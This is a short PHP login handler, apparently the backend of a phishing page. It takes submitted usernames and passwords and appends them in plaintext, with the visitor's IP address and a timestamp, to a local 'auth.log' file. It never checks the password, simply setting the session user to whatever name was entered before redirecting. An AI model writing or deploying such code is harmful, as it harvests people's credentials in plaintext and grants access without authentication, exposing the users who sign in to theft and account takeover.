<link rel="stylesheet" href="/hidden/assets/style.css">
<?php
session_start();
$user = $_POST['user'] ?? '';
$pass = $_POST['pass'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$entry = sprintf("[%s] IP=%s USER=%s PASS=%s\n", date('c'), $ip, $user, $pass);
file_put_contents(__DIR__ . '/auth.log', $entry, FILE_APPEND | LOCK_EX);
@chmod(__DIR__ . '/auth.log', 0640);
$_SESSION['user'] = $user;
header('Location: index.php');
exit;
?>
